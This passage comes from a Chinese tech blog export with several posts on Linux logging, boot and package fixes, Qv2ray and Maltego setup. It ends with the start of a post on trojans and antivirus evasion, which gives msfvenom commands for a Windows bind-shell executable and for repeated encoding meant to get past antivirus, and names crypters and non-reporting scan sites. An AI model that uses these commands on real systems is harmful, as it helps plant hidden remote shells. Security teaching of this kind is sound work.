<td>主要是系统的服务所产生的信息，例如 systemd 就是这个有关的讯息；</td>
</tr>
<tr>
<td>4</td>
<td>auth</td>
<td>主要与认证/授权有关的机制，例如 login, ssh, su 等需要账号/密码的操作；</td>
</tr>
<tr>
<td>5</td>
<td>syslog</td>
<td>由 syslog 相关协议产生的信息，其实就是 rsyslogd 这支程序本身产生的信息；</td>
</tr>
<tr>
<td>6</td>
<td>lpr</td>
<td>打印相关的讯息啊；</td>
</tr>
<tr>
<td>7</td>
<td>news</td>
<td>与新闻组服务器有关的信息；</td>
</tr>
<tr>
<td>8</td>
<td>uucp</td>
<td>全名为 Unix to Unix Copy Protocol，早期用于 unix 系统间的程序数据交换；</td>
</tr>
<tr>
<td>9</td>
<td>cron</td>
<td>例行性工作排程 cron/at 等产生的讯息记录；</td>
</tr>
<tr>
<td>10</td>
<td>authpriv</td>
<td>与 auth 类似，但记录较多账号私人的信息，包括 pam 模块的运作等；</td>
</tr>
<tr>
<td>11</td>
<td>ftp</td>
<td>与 FTP 通讯协议有关的讯息输出；</td>
</tr>
<tr>
<td>16-23</td>
<td>local0 ~ local7</td>
<td>保留给本机用户使用的一些登录文件讯息，较常与终端机互动。</td>
</tr>
</tbody></table>
<div class="note info simple"><p>软件开发者也可以通过上面的服务来定义自己的开发的软件，同时都调用syslog函数的mail服务名称</p>
</div>
<div class="note info simple"><p>上面的服务差异很打，比如mail服务多的要命，他会记录很多东西。这样的话我们就可以用其他的适合的服务进行记录日志</p>
</div>

<h2 id="信息等级"><a href="#信息等级" class="headerlink" title="信息等级"></a>信息等级</h2><div class="note info simple"><p>下面的是越靠近0问题越严重</p>
</div>

<table>
<thead>
<tr>
<th>等级数值</th>
<th>等级名称</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>debug</td>
<td align="left">用来 debug (除错) 时产生的讯息数据；</td>
</tr>
<tr>
<td>6</td>
<td>info</td>
<td align="left">仅是一些基本的讯息说明而已；</td>
</tr>
<tr>
<td>5</td>
<td>notice</td>
<td align="left">虽然是正常信息，但比 info 还需要被注意到的一些信息内容；</td>
</tr>
<tr>
<td>4</td>
<td>warning</td>
<td align="left">(warn)警示的讯息，可能有问题，但是还不至于影响到某个 daemon 运作的信息；基本上， info,notice, warn 这三个讯息都是在告知一些基本信息而已，应该还不至于造成一些系统运作困扰；</td>
</tr>
<tr>
<td>3</td>
<td>err</td>
<td align="left">(error)一些重大的错误讯息，例如配置文件的某些设定值造成该服务无法启动的信息说明， 通常藉由 err 的错误告知，应该可以了解到该服务无法启动的问题；</td>
</tr>
<tr>
<td>2</td>
<td>crit</td>
<td align="left">比 error 还要严重的错误信息，这个 crit 是临界点 (critical) 的缩写，这个错误已经很严重了喔；</td>
</tr>
<tr>
<td>1</td>
<td>alert</td>
<td align="left">警告警告，已经很有问题的等级，比 crit 还要严重；</td>
</tr>
<tr>
<td>0</td>
<td>emerg</td>
<td align="left">(panic)等级，意指系统已经几乎要宕机的状态。 很严重的错误信息了。通常大概只有硬件出问题，导致整个核心无法顺利运作，就会出现这样的等级的讯息。</td>
</tr>
</tbody></table>
<div class="note info simple"><p>下面还有两个特殊的等级</p>
</div>



<table>
<thead>
<tr>
<th align="left">等级名称</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">debug</td>
<td align="left">错误检查等级</td>
</tr>
<tr>
<td align="left">nome</td>
<td align="left">不需登录等级</td>
</tr>
</tbody></table>
<div class="note info simple"><p>在信息等级前面还有一个连接符合下面的是他的意思</p>
</div>

<table>
<thead>
<tr>
<th align="left">连接符合</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>.</code></td>
<td align="left">代表比后面还要严重的等级 (含该等级) 都被记录下来的意思，例如： mail.info 代表只要是 mail的信息，而且该信息等级严重于 info (含 info 本身)时，就会被记录下来的意思</td>
</tr>
<tr>
<td align="left"><code>.=</code></td>
<td align="left">代表所需要的等级就是后面接的等级而已， 其他的不要</td>
</tr>
<tr>
<td align="left"><code>.!</code></td>
<td align="left">代表不等于， 即除了该等级外的其他等级都记录</td>
</tr>
</tbody></table>
<p>一般来说，我们比较常使用的是<code>.</code>这个链接符号</p>
<h1 id="logrotate程序"><a href="#logrotate程序" class="headerlink" title="logrotate程序"></a>logrotate程序</h1><div class="note info simple"><p>他是提供日志定期删除用的<br>就是将旧的登录文件更改名称,然后创建一个空的登录文件,如此一来, 新的登录文件将重新开始记录,然后他长时间了就会自动删除以前的文件</p>
</div>

<h1 id="systemd程序"><a href="#systemd程序" class="headerlink" title="systemd程序"></a>systemd程序</h1><p>经过systemd程序启动的服务他都会记录，他用的是systemd-journald.service 服务</p>
<h1 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h1><div class="note info simple"><p>他的格式是</p>
</div>

<ol>
<li>发生的时间</li>
<li>发生的事件的主机名</li>
<li>启动事件的服务名</li>
<li>产生的实际内容</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~ » sudo cat  &#x2F;var&#x2F;log&#x2F;messages                                          </span><br><span class="line">[sudo] zss 的密码：        </span><br><span class="line">Mar  5 07:25:47 zss rsyslogd: [origin software&#x3D;&quot;rsyslogd&quot; swVersion&#x3D;&quot;8.2012.0&quot; x-pid&#x3D;&quot;657&quot; x-info&#x3D;&quot;https:&#x2F;&#x2F;www.rsyslog.com&quot;] rsyslogd was HUPed</span><br><span class="line">Mar  5 07:25:47 zss kernel: [    4.232728] EDAC amd64: F17h_M60h detected (node 0).</span><br><span class="line">Mar  5 07:25:47 zss kernel: [    4.232780] EDAC amd64: Node 0: DRAM ECC disabled.</span><br><span class="line">Mar  5 07:25:47 zss kernel: [    4.283804] r8169 0000:02:00.0 eth0: Link is Down</span><br><span class="line">Mar  5 07:25:47 zss kernel: [    4.341015] EDAC amd64: F17h_M60h detected (node 0).</span><br><span class="line">Mar  5 07:25:47 zss kernel: [    4.341063] EDAC amd64: Node 0: DRAM ECC disabled.</span><br><span class="line">Mar  5 07:25:47 zss kernel: [    4.413099] EDAC amd64: F17h_M60h detected </span><br></pre></td></tr></table></figure>
<p><strong>上面的意思</strong></p>
<div class="note info simple"><p><strong><code>Mar  5 07:25:47</code>的意思：</strong><code>Mar</code>是<code>三月</code>的意思，那<code>Mar  5 07:25:47</code>就是<code>3月5日07:25:47</code></p>
</div>

<div class="note info simple"><p><strong><code>zss</code>的意思：</strong>`使用的主机名</p>
</div>


<div class="note info simple"><p><strong><code>kernel</code>的意思：</strong>`程序名</p>
</div>


<div class="note info simple"><p><strong><code>[    4.232728] EDAC amd64: F17h_M60h detected (node 0)</code>的意思：</strong>`产生的实际内容</p>
</div>



<h1 id="更新中。。。。。"><a href="#更新中。。。。。" class="headerlink" title="更新中。。。。。"></a>更新中。。。。。</h1>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>kali 解决a start job is running for/dev/disk/bg-uuid</title>
    <url>/2021/01/25/linuxswap/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>看看开机他的启动显示卡在这个要30秒然后才启动</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/IMG_20210124_203234.jpg" alt="IMG_20210124_203234"></p>
<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>经过研究发现是我配置swap分区导致的</p>
<p>应为是修改了swap分区他的uuid变了所以启动的时候找不到</p>
<p>查看新配置的swap分区的uuid</p>
<p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">blkid</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210125174101811.png" alt="image-20210125174101811"></p>
<p><code>vi /etc/fstab</code>修改成上面的那个</p>
<p>叫上面的uuid修改这个</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210125174139415.png" alt="image-20210125174139415"></p>
]]></content>
      <categories>
        <category>问题的解决</category>
      </categories>
      <tags>
        <tag>问题的解决</tag>
      </tags>
  </entry>
  <entry>
    <title>双系统linux启动出现error:unknown filesystem</title>
    <url>/2021/09/08/linuxyindao/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note info simple"><p>记录这个问题是我在win扩展c盘导致的,应为DiskGenius扩展的时候要重启然后启动就变成这样了</p>
<p>我的系统是win10和kali linux2021.2</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210315085326409.png" alt="image-20210315085326409"></p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>在grub模式下不能TAB不能前后就很烦</p>
<p>我们可以输入ls查看分区</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210315085532741.png" alt="image-20210315085532741"></p>
<p><strong>我的linux分区<code>(hd0,gpt6)</code></strong></p>
<p>如果不知道的话可以输入<code>ls (hd0,gpt6)/boot/grub</code>查看<code>/boot/grub</code>文件如果不是linux分区就里面什么都没有如果是linux里面就会有下面这个显示</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210315085930555.png" alt="image-20210315085930555"></p>
<p>我们就可以手动启动分区</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> root=(hd0,gpt6)/boot/grub</span><br><span class="line"><span class="built_in">set</span> prefix=(hd0,gpt6)/boot/grub</span><br><span class="line">insmod normal</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210315090305183.png" alt="image-20210315090305183"></p>
<p>然后启动</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">normal</span><br></pre></td></tr></table></figure>
<p>他就可以进入系统了</p>
<div class="note info simple"><p><strong>进入系统后</strong><br>我安装linux启动grub</p>
</div>

<p>查看启动的目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo fdisk -l </span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210315094110979.png" alt="image-20210315094110979"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210315093801044.png" alt="image-20210315093801044"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grub-install  &#x2F;dev&#x2F;nvme0n1p6  #你的linux的路径                            </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/2021-03-14_21-10.png" alt="2021-03-14_21-10"></p>
<p>重启问题解决</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reboot </span><br></pre></td></tr></table></figure>




<p>参考</p>
<p><a href="https://blog.csdn.net/fengzilin1973/article/details/108939463">https://blog.csdn.net/fengzilin1973/article/details/108939463</a></p>
]]></content>
      <categories>
        <category>问题的解决</category>
      </categories>
      <tags>
        <tag>问题的解决</tag>
      </tags>
  </entry>
  <entry>
    <title>linux版qv2ray安装</title>
    <url>/2020/04/11/linux%E7%89%88qv2ray%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>在国内有的网络技术文档都已经很老了，在外国能查看到新的互联网技术进行学习<br>废话不多说</p>
<ol>
<li>下载V2ray客户端<br> 应为github下载的比较慢，我下载好的放到了蓝奏云里面，蓝奏云下载的快<br> <a href="https://wwa.lanzous.com/iIatmf0cmqf">https://wwa.lanzous.com/iIatmf0cmqf</a><br> 更多其他系统版本<br> <a href="https://github.com/Qv2ray/Qv2ray/releases/tag/v1.99.6">https://github.com/Qv2ray/Qv2ray/releases/tag/v1.99.6</a></li>
<li>下载核心<br> 应为github下载的比较慢，我下载好的放到了蓝奏云里面，蓝奏云下载的快<br> <a href="https://wwa.lanzous.com/ixPOUf0cpyb">https://wwa.lanzous.com/ixPOUf0cpyb</a><br> 更多其他系统版本<br> <a href="https://github.com/v2fly/v2ray-core/releases">https://github.com/v2fly/v2ray-core/releases/</a></li>
</ol>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>我创建了一个v2ray文件夹里面是解压好的下载的核心和V2ray客户端<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726184523611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<ol>
<li><p>然后在终端输入运行<br> 给他执行权限</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x .&#x2F;Qv2ray.v2.6.2.linux-x64.AppImage	 </span><br></pre></td></tr></table></figure>
<p> 运行</p>
</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;Qv2ray.v2.6.2.linux-x64.AppImage	 </span><br></pre></td></tr></table></figure></code></pre>
<ol start="2">
<li>设置<br> 设置中文<br> 他默认是英文的<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726192820628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></li>
</ol>
<p><strong>添加核心</strong><br>上面下载的核心文件里面的执行文件<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726194038573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加上面解压出来了的核心文件的根目录<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020072619422713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>工具安装</category>
        <category>qv2ray安装</category>
      </categories>
      <tags>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>linux系统用户apt下载安装输出dpkg 无法恢复的致命错误</title>
    <url>/2020/12/24/linux%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7apt%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E8%BE%93%E5%87%BAdpkg%20%E6%97%A0%E6%B3%95%E6%81%A2%E5%A4%8D%E7%9A%84%E8%87%B4%E5%91%BD%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="我遇到的问题"><a href="#我遇到的问题" class="headerlink" title="我遇到的问题"></a>我遇到的问题</h2><p>我之前安装过 netdata工具然后卸载了，这个工具安装的时候会创建一个名netdata的用户</p>
<p>然后我叫netdata工具给卸载，netdata也没有什么用了我就卸载了，然后在我安装东西的时候发现安装不上报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg: 无法恢复的致命错误，中止:</span><br><span class="line"> 在 stateoverride 文件中发现未知的系统用户 &#39;netdata&#39;；该系统用户在重载之前被移除。</span><br><span class="line">这很有可能是一个打包Bug。您可以通过 dpkg-statoverride 手动移除重载来进行恢复</span><br><span class="line">E: Sub-process &#x2F;usr&#x2F;bin&#x2F;dpkg returned an error code (2)</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20201225105923126.png" alt="image-20201225105923126"></p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>上面不是有写在 stateoverride 文件中发现未知的系统用户 ‘netdata’；该系统用户在重载之前被移除</p>
<p>我就想stateoverride文件里面是不是有什么配置错了</p>
<p>下面是我解决这个问题的方法</p>
<p>修改<code>vi /var/lib/dpkg/statoverride</code></p>
<p>叫这两个给删除就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdata netdata 755 &#x2F;var&#x2F;cache&#x2F;netdata</span><br><span class="line">netdata netdata 755 &#x2F;var&#x2F;lib&#x2F;netdata</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20201225105955635.png" alt="image-20201225105955635"></p>
<p>修改完就可以安装了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20201225110018392.png" alt="image-20201225110018392"></p>
]]></content>
      <categories>
        <category>问题的解决</category>
      </categories>
      <tags>
        <tag>问题的解决</tag>
      </tags>
  </entry>
  <entry>
    <title>maltego工具详细使用</title>
    <url>/2020/11/16/maltego%E5%B7%A5%E5%85%B7%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>下面是我自己摸索出来的和看到文章如果有什么错误的地址告诉我</strong></p>
<p>工具打开就是这样的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114093448.png"><br>下面这个是我用工具翻译的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/mmexport1605315701668.jpg"></p>
<p>下面是我翻译的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114094129.png"></p>
<h2 id="maltego注册和配置"><a href="#maltego注册和配置" class="headerlink" title="maltego注册和配置"></a>maltego注册和配置</h2><p>maltego工具进入需要注册<br>下面这个版本是社区版注册一个账号就可以用了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114094330.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114113548.png">PP<br>这个需要等一会<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114112618.png"><br>他的注册地址<a href="https://www.maltego.com/ce-registration/">https://www.maltego.com/ce-registration/</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115105017.png"></p>
<p>下面这个输入注册的邮箱和密码和验证码就可以了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115111251.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115111237.png"><br>他这个会安装一些插件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115112028.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115113022.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115113257.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115114939.png"></p>
<h2 id="安装模块和使用介绍"><a href="#安装模块和使用介绍" class="headerlink" title="安装模块和使用介绍"></a>安装模块和使用介绍</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115160153.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115145752.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115151450.png"><br>有的可能要API<br>去官方登录就有了</p>
<h2 id="添加创建目标"><a href="#添加创建目标" class="headerlink" title="添加创建目标"></a>添加创建目标</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115154253.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201115171022.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116112035.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116112933.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116113244.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116113317.png"></p>
<p>配置完后直接点击OK就可以了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116114400.png"></p>
<p>或者自己在这个上面右键也是一样的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116114504.png"></p>
<p>我这个就选择用我已经下载好的全部插件进行扫描</p>
<p>直接全部勾选完</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116115009.png"></p>
<h2 id="显示修改"><a href="#显示修改" class="headerlink" title="显示修改"></a>显示修改</h2><p>下面这个是选择扫描显示图<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116115742.png"></p>
<p>我顺便选择一个看看<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116115846.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116120607.png"></p>
<p>比如我们全选<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116120755.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116141640.png"></p>
<h2 id="实体的意思添加和修改"><a href="#实体的意思添加和修改" class="headerlink" title="实体的意思添加和修改"></a>实体的意思添加和修改</h2><h3 id="实体说明"><a href="#实体说明" class="headerlink" title="实体说明"></a>实体说明</h3><p>下面这些图标显示的是什么意思<br>下面是我自己用翻译软件翻译的可能不太好<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116142743.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116145758.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/mmexport1605510195759.jpg"></p>
<h3 id="实体添加"><a href="#实体添加" class="headerlink" title="实体添加"></a>实体添加</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116161248.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116161506.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116161149.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116161721.png"></p>
<p>这样搜索就可以搜索到了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116161751.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116162138.png"></p>
<h2 id="搜索的数量"><a href="#搜索的数量" class="headerlink" title="搜索的数量"></a>搜索的数量</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201116162305.png"></p>
<h2 id="官方使用指南"><a href="#官方使用指南" class="headerlink" title="官方使用指南"></a>官方使用指南</h2><p><a href="https://docs.maltego.com/support/home">https://docs.maltego.com/support/home</a></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>信息收集类工具</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>1.木马病毒和免杀技术</title>
    <url>/2020/03/31/ms/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p> 第17章  免杀</p>
<h1 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h1><h2 id="叫杀毒软件变成了防病毒软件"><a href="#叫杀毒软件变成了防病毒软件" class="headerlink" title="叫杀毒软件变成了防病毒软件"></a>叫杀毒软件变成了防病毒软件</h2><ul>
<li>为什么叫防病毒软件<ul>
<li>应为做的黑客做出来木马病毒运行在很底层<ul>
<li>在开机运行之前木马病毒就在引导的时候已经启动了所以杀毒软件杀不了他</li>
</ul>
</li>
<li>企业的防病毒软件<ul>
<li>企业的防病毒软件都有一个单独的控制台</li>
<li>控制台就可以控制企业下面的所以设备的安全</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="杀毒软件的原理"><a href="#杀毒软件的原理" class="headerlink" title="杀毒软件的原理"></a>杀毒软件的原理</h2><ol>
<li>杀毒软件的有一个病毒库，里面存放着特征码</li>
<li>基于对二进制的文件或者对数据包进行还原后的里面的特征字符进行比较</li>
<li>还有行为分析比如修改你的注册表，插入进程里面，修改你的文件等等等方法就叫&lt;启发式&gt;</li>
</ol>
<h1 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h1><h2 id="免杀技术有两大种"><a href="#免杀技术有两大种" class="headerlink" title="免杀技术有两大种"></a>免杀技术有两大种</h2><p>现在还有的黑客进行逆向分析杀毒软件，看你的杀毒软件是怎么进行分析的 </p>
<ol>
<li>修改<ol>
<li>如果一个黑客知道那个杀毒软件的厂商，定义病毒的特点<br>就可以进行用二进行修改，替换等等等达到免杀技术</li>
</ol>
</li>
<li>2.加密技术（crypter）<ol>
<li>通过加密使得特征字符不可读，来逃避查杀</li>
<li>还有叫木马程序注入到MP3里面，还照片里面</li>
</ol>
</li>
</ol>
<h2 id="FUD是全免杀技术"><a href="#FUD是全免杀技术" class="headerlink" title="FUD是全免杀技术"></a>FUD是全免杀技术</h2><h2 id="查杀网站"><a href="#查杀网站" class="headerlink" title="查杀网站"></a>查杀网站</h2><ol>
<li>下面是明查杀网站，他们会共享给杀毒软件，进行分享然后在加入特征库<br> <a href="https://www.virustotal.com/">https://www.virustotal.com/</a><br> <a href="http://www.virscan.org/">http://www.virscan.org/</a></li>
<li>搞黑的<br> <a href="https://nodistribute.com/">https://nodistribute.com/</a><br> <a href="http://viruscheckmate.com/check/">http://viruscheckmate.com/check/</a></li>
</ol>
<h1 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h1><h2 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a>生成反弹shell</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</span><br></pre></td></tr></table></figure>
<p><code>-p</code> 选择一个绑定tcp端口的shell    ，<code>-a</code> 选择操作系统的架构<br><code>--platform</code> 指定的平台，win就是windows系统<br><code>-f</code>以exe格式输出   <code>-o</code>输出成<code>a.exe</code></p>
<h2 id="加密编码反弹-shell"><a href="#加密编码反弹-shell" class="headerlink" title="加密编码反弹 shell"></a>加密编码反弹 shell</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b &#x27;\x00&#x27; -f exe -o b.exe</span><br></pre></td></tr></table></figure>
<p><code>raw</code>进行加密编码  ， <code>-e</code>是指定的是x86/shikata_ga_nai模块<br><code>-i</code> 5就是这个x86/shikata_ga_nai模块加密5次 ，在用管道在用x86/countdown模块进行8次加密，在用x86/shikata_ga_nai模块在加密9次<br><code>-b</code> 过滤字符<br>生成<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200331115251337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现加密和不加密的大小一样，看一下md5是一样的<br>用md5sum工具<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200331115823286.png" alt="在这里插入图片描述"><br>strings工具可以查看程序可读的内容<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200331120039467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="查看一下用在线病毒查杀看一下加密和不加密的"><a href="#查看一下用在线病毒查杀看一下加密和不加密的" class="headerlink" title="查看一下用在线病毒查杀看一下加密和不加密的"></a>查看一下用在线病毒查杀看一下加密和不加密的</h2><p>在线查杀病毒就是居于特征码的，在系统完全安装杀毒软件不这个要准确</p>
<ol>
